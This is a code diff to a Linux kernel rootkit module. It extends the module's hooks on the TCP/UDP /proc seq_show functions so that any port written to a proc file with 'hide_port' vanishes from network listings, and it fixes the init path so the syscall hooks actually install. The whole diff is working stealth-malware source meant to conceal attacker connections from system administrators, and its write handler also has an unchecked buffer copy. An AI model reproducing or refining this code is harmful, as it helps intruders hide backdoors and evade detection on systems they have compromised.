@@ -256,8 +256,11 @@ LIST_HEAD(hide_ports_list);
 
 static unsigned int find_port(unsigned short sport, unsigned short dport) {
     struct hide_ports *h;
+    unsigned short port;
     list_for_each_entry(h, &hide_ports_list, list) {
-        if (h->port == sport || h->port == dport) {
+        //printk(KERN_INFO "find_port: %d\n", h->port);
+        port = htons(h->port);
+        if (port == sport || port == dport) {
             return true;
         }
     }
@@ -266,29 +269,32 @@ static unsigned int find_port(unsigned short sport, unsigned short dport) {
  
 static asmlinkage int hook_tcp4_seq_show(struct seq_file *seq, void *v) {
     struct inet_sock *is;
-    unsigned short port = htons(5700);
-
-    // if (v != SEQ_START_TOKEN) {
-    //     is = (struct inet_sock *)v;
-    //     if (find_port())
-    // }
+    //unsigned short port = htons(5700);
 
     if (v != SEQ_START_TOKEN) {
         is = (struct inet_sock *)v;
-        if (port == is->inet_sport || port == is->inet_dport) {
+        if (find_port(is->inet_sport, is->inet_dport)) {
             printk(KERN_DEBUG "rootkit: sport: %d, dport: %d\n", ntohs(is->inet_sport), ntohs(is->inet_dport));
             return 0;
         }
     }
+
+    // if (v != SEQ_START_TOKEN) {
+    //     is = (struct inet_sock *)v;
+    //     if (port == is->inet_sport || port == is->inet_dport) {
+    //         printk(KERN_DEBUG "rootkit: sport: %d, dport: %d\n", ntohs(is->inet_sport), ntohs(is->inet_dport));
+    //         return 0;
+    //     }
+    // }
     return orig_tcp4_seq_show(seq, v);
 }
 
 static asmlinkage int hook_tcp6_seq_show(struct seq_file *seq, void *v) {
     struct inet_sock *is;
-    unsigned short port = htons(5700);
+    // unsigned short port = htons(5700);
     if (v != SEQ_START_TOKEN) {
         is = (struct inet_sock *)v;
-        if (port == is->inet_sport || port == is->inet_dport) {
+        if (find_port(is->inet_sport, is->inet_dport)) {
             printk(KERN_DEBUG "rootkit: sport: %d, dport: %d\n", ntohs(is->inet_sport), ntohs(is->inet_dport));
             return 0;
         }
@@ -298,10 +304,10 @@ static asmlinkage int hook_tcp6_seq_show(struct seq_file *seq, void *v) {
 
 static asmlinkage int hook_udp4_seq_show(struct seq_file *seq, void *v) {
     struct inet_sock *is;
-    unsigned short port = htons(111);
+    // unsigned short port = htons(111);
     if (v != SEQ_START_TOKEN) {
         is = (struct inet_sock *)v;
-        if (port == is->inet_sport || port == is->inet_dport) {
+        if (find_port(is->inet_sport, is->inet_dport)) {
             printk(KERN_DEBUG "rootkit: sport: %d, dport: %d\n", ntohs(is->inet_sport), ntohs(is->inet_dport));
             return 0;
         }
@@ -311,11 +317,11 @@ static asmlinkage int hook_udp4_seq_show(struct seq_file *seq, void *v) {
 
 static asmlinkage int hook_udp6_seq_show(struct seq_file *seq, void *v) {
     struct inet_sock *is;
-    unsigned short port = htons(111);
+    // unsigned short port = htons(111);
     if (v != SEQ_START_TOKEN) {
         is = (struct inet_sock *)v;
-        if (port == is->inet_sport || port == is->inet_dport) {
-            printk(KERN_DEBUG "rootkit: sport %d, dport: %d\n", ntohs(is->inet_sport), ntohs(is->inet_dport));
+        if (find_port(is->inet_sport, is->inet_dport)) {
+            printk(KERN_DEBUG "rootkit: sport: %d, dport: %d\n", ntohs(is->inet_sport), ntohs(is->inet_dport));
             return 0;
         }
     }
@@ -323,11 +329,61 @@ static asmlinkage int hook_udp6_seq_show(struct seq_file *seq, void *v) {
 }
 /*---------------hide port end------------------*/
 
+static struct hide_ports* exist(unsigned short port) {
+    struct hide_ports *h;
+    list_for_each_entry(h, &hide_ports_list, list) {
+        if (port == h->port)
+            return h;
+    }
+    return NULL;
+}
+
+static void execute(char *cmd, int idx) {
+    unsigned short port;
+    struct hide_ports *new_port;
+    if (strcmp(cmd, "hide_port") == 0) {
+        if (kstrtou16((char *) str + idx, 10, &port) == 0) {
+            printk(KERN_INFO "port: %d\n", port);
+            if (exist(port) == NULL) {
+                new_port = kmalloc(sizeof(struct hide_ports), GFP_KERNEL);
+                new_port->port = port;
+                list_add(&new_port->list, &hide_ports_list);
+            }
+        } else {
+            printk(KERN_DEBUG "wrong cmd: %s, wrong port: %s\n", cmd, (char *)str + idx);
+            return;
+        }
+    } else if (strcmp(cmd, "unhide_port") == 0) {
+        if (kstrtou16((char *) str + idx, 10, &port) == 0) {
+            printk(KERN_INFO "port: %d\n", port);
+            struct hide_ports* target = exist(port);
+            if (target != NULL) 
+                list_del(&target->list);
+        } else {
+            printk(KERN_DEBUG "wrong cmd: %s, wrong port: %s\n", cmd, (char *)str + idx);
+            return;
+        }
+    }
+}
+
 /*---------------read and write on proc start-----------------*/
 static ssize_t write(struct file *file, const char __user *buffer, size_t count, loff_t *f_pos) {
+    int i;
+    char *cmd, *p;    
+    memset(str, 0x0, 100);
     if (copy_from_user(str, buffer, count)) {
         return -1;
     }
+    
+    for (i = 0; i < strlen(str); i++) {
+        if (*(str + i) == ' ')
+            break;
+    }
+    cmd = kzalloc(i + 1, GFP_KERNEL);
+    strncpy(cmd, str, i);
+    cmd[i] = '\0';
+    execute(cmd, i + 1);
+
     printk(KERN_INFO "write from user: %s\n", str);
     return count;
 }
@@ -375,13 +431,14 @@ static int __init rootkit_init(void) {
         return -1;
     } else {
         printk(KERN_INFO "test create successfully\n");
-        return 0;
     }
 
     //hook syscalls in kernel
     err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
-    if (err) 
+    if (err) {
+        printk(KERN_INFO "fh_install_hooks error: %d\n", err);
         return err;
+    }
  
     printk(KERN_INFO "rootkit: Loaded :-)\n");
     return 0;
